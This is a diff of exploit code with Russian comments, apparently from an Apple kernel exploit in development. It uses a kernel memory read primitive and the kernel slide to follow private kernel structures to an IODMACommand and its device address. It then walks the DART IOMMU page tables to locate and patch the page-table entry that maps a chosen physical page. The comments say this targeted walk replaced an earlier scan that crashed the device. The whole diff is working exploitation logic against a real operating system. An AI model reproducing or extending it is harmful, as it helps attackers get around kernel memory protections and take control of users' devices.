@@ -6618,11 +6618,13 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                   (unsigned long long)kvtophys(provVA), (unsigned long long)kvtophys(dartVA)]);
         uint64_t pteVA = 0, origPTE = 0;
         uint64_t kslide2 = kconstant(base) - 0xfffffff007004000ULL;
-        // 1.9.162 (р.37): цепочка B — verify, что mapping ПЕРСИСТИТ:
-        // provider+0xb8 = scheduler → entry-array(+0xc8) → наша запись
-        // (credit +0xc3c==0x10) → [entry+0x98]/[+0xa0] = mappingObj (vt 0x7af4ea0,
-        // +0x18=mapper). Плюс объяснение group=0: [dart+0xc50] = транзиентная
-        // транзакция, живёт только во время map — её и не должно быть.
+        // 1.9.164 (р.38): таргетированный PTE — дикий скан dartObj УБРАН (он и
+        // ребутил девайс SPTM-ресетом). Путь: provider+0xb8=scheduler →
+        // entry-array(+0xc8) → наша запись (credit +0xc3c==0x10) →
+        // cmd(IODMACommand, vt 0x7afa9e8) = [entry+0x98/+0xa0] → mapObj=[cmd+0x70]
+        // → DVA=[mapObj+0xa0] → pageIdx=DVA>>14 → walk L0/L1/L2/leaf (valid=bit0,
+        // child=(e<<4)&0x3ffffffc000) → PTE. Патч ТОЛЬКО при совпадении PA-маски.
+        uint64_t cmdVA = 0, dva = 0, dvaLen = 0;
         if (kpLooksLikeKernelPointer(provVA)) {
             uint64_t schVA = kp_untag_ptr(early_kread64(provVA + 0xb8));
             uint64_t earr = kpLooksLikeKernelPointer(schVA) ? kp_untag_ptr(early_kread64(schVA + 0xc8)) : 0;
@@ -6630,57 +6632,93 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             kpNote(r, [NSString stringWithFormat:@"  [P2] chain-B: scheduler=%#llx arr=%#llx count=%llu",
                       (unsigned long long)schVA, (unsigned long long)earr, (unsigned long long)ecnt]);
             if (kpLooksLikeKernelPointer(earr) && ecnt && ecnt <= 384) {
-                for (uint64_t i = 0; i < ecnt; i++) {
+                for (uint64_t i = 0; i < ecnt && !cmdVA; i++) {
                     uint64_t ep = kp_untag_ptr(early_kread64(earr + i * 8));
-                    if (!kpLooksLikeKernelPointer(ep)) continue;
+                    if (!kpLooksLikeKernelPointer(ep) || !kvtophys(ep)) continue;
                     if ((uint32_t)(early_kread64(ep + 0xc38) >> 32) != 0x10) continue;
-                    for (uint32_t mo = 0x98; mo <= 0xa0; mo += 8) {
-                        uint64_t moVA = kp_untag_ptr(early_kread64(ep + mo));
-                        if (!kpLooksLikeKernelPointer(moVA)) continue;
-                        uint64_t movt = kp_untag_ptr(early_kread64(moVA));
-                        uint64_t moFile = movt ? movt - kslide2 : 0;
-                        kpNote(r, [NSString stringWithFormat:@"  [P2] chain-B: запись %#llx +%#x → mappingObj=%#llx vt(file)=%#llx%@",
-                                  (unsigned long long)ep, mo, (unsigned long long)moVA,
-                                  (unsigned long long)moFile,
-                                  moFile == 0x7af4ea0 ? @" ✓ mapping ЖИВ" : @""]);
+                    kpNote(r, [NSString stringWithFormat:@"  [P2] chain-B: наша запись %#llx (credit ✓)", (unsigned long long)ep]);
+                    for (uint32_t mo = 0x98; mo <= 0xa0 && !cmdVA; mo += 8) {
+                        uint64_t cand = kp_untag_ptr(early_kread64(ep + mo));
+                        if (!kpLooksLikeKernelPointer(cand) || !kvtophys(cand)) continue;
+                        uint64_t cvt = kp_untag_ptr(early_kread64(cand));
+                        uint64_t cFile = cvt ? cvt - kslide2 : 0;
+                        kpNote(r, [NSString stringWithFormat:@"    +%#x → cmd=%#llx vt(file)=%#llx%@",
+                                  mo, (unsigned long long)cand, (unsigned long long)cFile,
+                                  cFile == 0x7afa9e8 ? @" = IODMACommand ✓" : @""]);
+                        if (cFile == 0x7afa9e8) cmdVA = cand;
                     }
-                    break;
                 }
             }
         }
-        // Корни DART-таблиц — в dartObj с init (р.37): дампим ВСЕ указатели
-        // dartObj (до 0x1000), за каждым — страница PTE; ищем по PA-маске.
-        if (kpLooksLikeKernelPointer(dartVA)) {
+        if (cmdVA) {
+            uint64_t mapObj = kp_untag_ptr(early_kread64(cmdVA + 0x70));
+            if (kpLooksLikeKernelPointer(mapObj) && kvtophys(mapObj)) {
+                dva = early_kread64(mapObj + 0xa0);
+                dvaLen = early_kread64(mapObj + 0xa8);
+                kpNote(r, [NSString stringWithFormat:@"  [P2] IODMACommand=%#llx mapObj=%#llx DVA=%#llx len=%#llx",
+                          (unsigned long long)cmdVA, (unsigned long long)mapObj,
+                          (unsigned long long)dva, (unsigned long long)dvaLen]);
+            }
+        }
+        if (dva && kpLooksLikeKernelPointer(dartVA)) {
             uint64_t dvt = kp_untag_ptr(early_kread64(dartVA));
             kpNote(r, [NSString stringWithFormat:@"  [P2] dart=%#llx vt=%#llx (file %#llx; ждём 0x7dafcb0)%@",
                       (unsigned long long)dartVA, (unsigned long long)dvt,
                       (unsigned long long)(dvt ? dvt - kslide2 : 0),
                       dvt - kslide2 == 0x7dafcb0 ? @" ✓" : @""]);
-            uint64_t gptrs[32];
-            int gn = 0, gskip = 0;
-            for (uint32_t o = 0; o + 8 <= 0x1000 && gn < 32; o += 8) {
-                uint64_t p = kp_untag_ptr(early_kread64(dartVA + o));
-                if (!kpLooksLikeKernelPointer(p)) continue;
-                BOOL dup = NO;
-                for (int j = 0; j < gn; j++) if (gptrs[j] == p) { dup = YES; break; }
-                if (dup) continue;
-                if (!kvtophys(p)) { gskip++; continue; }   // 1.9.163: немапнутый → пропуск (SPTM-ресет гейт)
-                gptrs[gn++] = p;
+            // корень таблиц: group=[dart+0xc50] (транзиентная?) → [group+0x170]
+            // segIdx=0; fallback — персистентный дубль [dart+0xcd0+i*8] → +0x80 (р.38)
+            uint64_t tableRoot = 0;
+            uint64_t grp = kp_untag_ptr(early_kread64(dartVA + 0xc50));
+            if (kpLooksLikeKernelPointer(grp) && kvtophys(grp)) {
+                tableRoot = kp_untag_ptr(early_kread64(grp + 0x170));
+                kpNote(r, [NSString stringWithFormat:@"  [P2] group=%#llx → tableRoot(+0x170)=%#llx",
+                          (unsigned long long)grp, (unsigned long long)tableRoot]);
             }
-            kpNote(r, [NSString stringWithFormat:@"  [P2] dartObj: %d указателей (пропущено немапнутых %d) — сканирую страницы на PTE (PA-маска)", gn, gskip]);
-            for (int g = 0; g < gn && !pteVA; g++) {
-                uint32_t lim2 = 0x4000 - (uint32_t)(gptrs[g] & 0x3fff);
-                for (uint32_t o2 = 0; o2 + 8 <= lim2; o2 += 8) {
-                    uint64_t q = early_kread64(gptrs[g] + o2);
-                    if ((q & 0x000003FFFE000000ULL) != (backingPA & 0x000003FFFE000000ULL)) continue;
-                    if (!(q & ~0x000003FFFE000000ULL)) continue;   // голый PA без флагов — не PTE
-                    pteVA = gptrs[g] + o2;
-                    origPTE = q;
-                    kpNote(r, [NSString stringWithFormat:@"  [P2] ★ PTE @ %#llx (страница %#llx): %#018llx (флаги %#llx)",
-                              (unsigned long long)pteVA, (unsigned long long)gptrs[g],
-                              (unsigned long long)q, (unsigned long long)(q >> 51)]);
-                    break;
+            if (!kpLooksLikeKernelPointer(tableRoot)) {
+                for (uint32_t i = 0; i < 8 && !tableRoot; i++) {
+                    uint64_t dup = kp_untag_ptr(early_kread64(dartVA + 0xcd0 + (uint64_t)i * 8));
+                    if (!kpLooksLikeKernelPointer(dup) || !kvtophys(dup)) continue;
+                    uint64_t leaf = kp_untag_ptr(early_kread64(dup + 0x80));
+                    kpNote(r, [NSString stringWithFormat:@"  [P2] дубль [%u]=%#llx → +0x80=%#llx", i,
+                              (unsigned long long)dup, (unsigned long long)leaf]);
+                    if (kpLooksLikeKernelPointer(leaf) && kvtophys(leaf)) tableRoot = leaf;
                 }
+            }
+            if (kpLooksLikeKernelPointer(tableRoot) && kvtophys(tableRoot)) {
+                uint64_t pageIdx = dva >> 14;
+                uint32_t idxs[4] = { (uint32_t)((pageIdx & 0x3e00000000ULL) >> 33),
+                                     (uint32_t)((pageIdx & 0x1ffc00000ULL) >> 22),
+                                     (uint32_t)((pageIdx & 0x3ff800ULL) >> 11),
+                                     (uint32_t)(pageIdx & 0x7ff) };
+                kpNote(r, [NSString stringWithFormat:@"  [P2] walk: DVA=%#llx pageIdx=%#llx idx L0=%u L1=%u L2=%u leaf=%u (root=%#llx)",
+                          (unsigned long long)dva, (unsigned long long)pageIdx,
+                          idxs[0], idxs[1], idxs[2], idxs[3], (unsigned long long)tableRoot]);
+                uint64_t tbl = tableRoot;
+                for (int lvl = 0; lvl < 4 && !pteVA; lvl++) {
+                    uint64_t ent = early_kread64(tbl + (uint64_t)idxs[lvl] * 8);
+                    kpNote(r, [NSString stringWithFormat:@"    L%d[%u] @ %#llx = %#018llx", lvl, idxs[lvl],
+                              (unsigned long long)(tbl + (uint64_t)idxs[lvl] * 8), (unsigned long long)ent]);
+                    if (lvl == 3) {
+                        pteVA = tbl + (uint64_t)idxs[3] * 8;
+                        origPTE = ent;
+                        break;
+                    }
+                    if (!(ent & 1)) { kpNote(r, @"    обрыв: entry невалиден (bit0=0)"); break; }
+                    tbl = (ent << 4) & 0x3ffffffc000ULL;
+                    if (!kpLooksLikeKernelPointer(tbl) || !kvtophys(tbl)) { kpNote(r, @"    обрыв: child не резолвится"); break; }
+                }
+                if (pteVA) {
+                    if ((origPTE & 0x000003FFFE000000ULL) == (backingPA & 0x000003FFFE000000ULL)) {
+                        kpNote(r, @"  [P2] ★ PTE PA совпал с backingPA — патчим");
+                    } else {
+                        kpNote(r, [NSString stringWithFormat:@"  [P2] PTE PA %#018llx ≠ backingPA — НЕ патчим (чужой PTE, проверить segIdx/индексы)",
+                                  (unsigned long long)origPTE]);
+                        pteVA = 0;
+                    }
+                }
+            } else {
+                kpNote(r, @"  [P2] tableRoot не найден (group/дубль пусты)");
             }
         }
         if (pteVA) {
